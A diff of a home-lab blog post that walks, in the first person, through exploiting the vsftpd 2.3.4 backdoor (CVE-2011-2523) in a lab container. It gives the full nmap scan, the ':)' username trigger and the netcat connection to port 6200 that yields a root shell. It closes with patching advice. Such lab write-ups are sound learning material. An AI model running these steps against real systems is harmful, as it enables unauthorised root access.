@@ -18,16 +18,16 @@ categories:
 
 ## Prerequisites
 
-Before starting, make sure the following are in place:
+Before starting, I made sure the following were in place:
 
 1. VirtualBox or VMware Workstation Pro installed
-2. `project-x-corp-svr` is configured with Docker
-3. FTP container (`ftp-svr`) is set up and configured
-4. `project-x-attacker` is turned on
+2. My `project-x-corp-svr` is configured with Docker
+3. My FTP container (`ftp-svr`) is set up and configured
+4. My `project-x-attacker` is turned on
 
 ## Scenario
 
-In this scenario, the attacker (`project-x-attacker`) identifies that the corporate server (`10.0.0.8`) is running an FTP service on port 21. Through reconnaissance, they match the software version to a known CVE and discover the server is running **vsftpd 2.3.4** — a version that contains a deliberately planted backdoor. By sending a specially crafted username string during the FTP login, the attacker triggers the backdoor, which opens a shell on port 6200. A netcat connection to that port gives the attacker a root shell inside the container — no password required.
+In this scenario, I acted as the attacker (`project-x-attacker`) and identified that the corporate server (`10.0.0.8`) was running an FTP service on port 21. Through reconnaissance, I matched the software version to a known CVE and discovered the server was running **vsftpd 2.3.4** — a version that contains a deliberately planted backdoor. By sending a specially crafted username string during the FTP login, I triggered the backdoor, which opened a shell on port 6200. A netcat connection to that port gave me a root shell inside the container — no password required.
 
 ## Likeliness Meter
 
@@ -73,73 +73,77 @@ Exploitation of outdated software can lead to:
 
 ### Step 1 — Start the FTP Container
 
-On `project-x-corp-svr`, make sure the FTP container is running:
+On `project-x-corp-svr`, I made sure the FTP container was running:
 
 ```bash
 docker start ftp-svr
 ```
 
-Log into the container's bash shell:
+I logged into the container's bash shell:
 
 ```bash
 docker exec -it ftp-svr /bin/bash
 ```
 
 ![Terminal on `project-x-corp-svr` showing `docker exec -it ftp-svr /bin/bash` dropping into the container's root shell — confirming the FTP container is up and accessible.](screenshot1.png)
+*Dropping into the FTP container's root shell to start the service.*
 
 ### Step 2 — Start vsftpd Inside the Container
 
-Navigate to the vsftpd directory and run the binary:
+I navigated to the vsftpd directory and ran the binary:
 
 ```bash
 cd vsftpd-2.3.4
 vsftpd
 ```
 
-The terminal will go blank after running `vsftpd` — this is expected. The service is now running in the foreground, listening on port 21 for incoming FTP connections.
+The terminal went blank after running `vsftpd` — this was expected. The service was now running in the foreground, listening on port 21 for incoming FTP connections.
 
 ![Terminal inside the FTP container showing `vsftpd` running — the blank output confirming the service is listening and waiting for connections on port 21.](screenshot2.png)
+*Starting the intentionally vulnerable `vsftpd` service.*
 
 ### Step 3 — Scan the Target from the Attacker Machine
 
-On `project-x-attacker`, open a new terminal and run an Nmap scan against the corporate server to identify what's running on port 21:
+On `project-x-attacker`, I opened a new terminal and ran an Nmap scan against the corporate server to identify what was running on port 21:
 
 ```bash
 nmap -p 21 -sV 10.0.0.8
 ```
 
-The scan returns the service version — **vsftpd 2.3.4**. This is the version we need. Cross-referencing this against a CVE database reveals **CVE-2011-2523** and the backdoor behaviour immediately.
+The scan returned the service version — **vsftpd 2.3.4**. This was the version I needed. Cross-referencing this against a CVE database revealed **CVE-2011-2523** and the backdoor behaviour immediately.
 
 ![Kali terminal showing the Nmap scan output against `10.0.0.8` — port 21 returning `vsftpd 2.3.4` as the service version, the exact version tied to CVE-2011-2523.](screenshot3.png)
+*My Nmap scan successfully identifying the vulnerable vsftpd 2.3.4 version.*
 
 ### Step 4 — Trigger the Backdoor via FTP Login
 
-On `project-x-attacker`, use the built-in `ftp` command to connect to the FTP server:
+On `project-x-attacker`, I used the built-in `ftp` command to connect to my FTP server:
 
 ```bash
 ftp 10.0.0.8
 ```
 
-When prompted for a username, enter **any username ending with `:)`** — this is the trigger string that activates the backdoor:
+When prompted for a username, I entered **any username ending with `:)`** — this is the trigger string that activated the backdoor:
 
 ```
 Name: anyuser:)
 Password: anypassword
 ```
 
-The login will appear to fail or hang — that's fine. The important thing is that sending a username containing `:)` has already triggered the backdoor code inside vsftpd, which is now opening a shell listener on port 6200 in the background.
+The login appeared to fail or hang — that was fine. The important thing was that sending a username containing `:)` had already triggered the backdoor code inside vsftpd, which was now opening a shell listener on port 6200 in the background.
 
 ![Kali terminal showing the `ftp 10.0.0.8` connection with the username `anyuser:)` and a random password entered — the FTP prompt showing the login attempt, with the `:)` trigger string clearly visible in the username field.](screenshot4.png)
+*Triggering the backdoor by supplying the `:)` string in my username.*
 
 ### Step 5 — Connect to the Backdoor Shell via Netcat
 
-Open a **new terminal tab** on `project-x-attacker` and connect to port 6200 using netcat:
+I opened a **new terminal tab** on `project-x-attacker` and connected to port 6200 using netcat:
 
 ```bash
 nc 10.0.0.8 6200
 ```
 
-You now have a shell inside the FTP container. Confirm the access level:
+I now had a shell inside the FTP container. I confirmed the access level:
 
 ```bash
 whoami
@@ -148,17 +152,18 @@ whoami
 The response: `root`.
 
 ![Kali terminal showing `nc 10.0.0.8 6200` connecting successfully — the shell prompt appearing, followed by `whoami` returning `root`, confirming full root access inside the vsftpd container via the CVE-2011-2523 backdoor.](screenshot5.png)
+*Connecting via netcat to port 6200 and confirming I had root access.*
 
-The backdoor has been successfully triggered. With a root shell inside the container, the attacker has full control — they can read files, pivot to other services on the host, install persistence mechanisms, or use the container as a launching point for further attacks on the `10.0.0.0/24` network.
+The backdoor was successfully triggered. With a root shell inside the container, I had full control — I could read files, pivot to other services on the host, install persistence mechanisms, or use the container as a launching point for further attacks on my `10.0.0.0/24` network.
 
 ## Conclusion
 
-CVE-2011-2523 is one of the most straightforward exploits in the playbook — trigger a string, open a port, get root. The exploit itself requires no special tooling, no brute force, and no credentials. It's three commands from start to shell.
+CVE-2011-2523 is one of the most straightforward exploits in the playbook — trigger a string, open a port, get root. The exploit itself required no special tooling, no brute force, and no credentials from me. It was three commands from start to shell.
 
-What makes this exercise valuable isn't the specific CVE — it's the **pattern**. The exact same sequence (scan → version match → CVE lookup → exploit) is how a huge proportion of real-world compromises begin. Attackers aren't always writing zero-days. More often, they're running automated scanners across IP ranges, finding services running versions from three years ago, and hitting them with exploits that have been public knowledge since the vulnerability was disclosed.
+What made this exercise valuable to me wasn't the specific CVE — it was the **pattern**. The exact same sequence (scan → version match → CVE lookup → exploit) is how a huge proportion of real-world compromises begin. Attackers aren't always writing zero-days. More often, they're running automated scanners across IP ranges, finding services running versions from three years ago, and hitting them with exploits that have been public knowledge since the vulnerability was disclosed.
 
-The defence is unglamorous but effective: **patch regularly, audit your software inventory, and run vulnerability scans against your own infrastructure**. If you find an outdated version, assume an attacker has already found it too.
+The defence is unglamorous but effective: **patch regularly, audit your software inventory, and run vulnerability scans against your own infrastructure**. If I can find an outdated version, I assume a real attacker has already found it too.
 
 ---
 
-*Next up — Credential Stuffing, where we take a list of known username and password pairs and systematically test them against the internal web portal.*
+*Next up — Credential Stuffing, where I take a list of known username and password pairs and systematically test them against the internal web portal.*
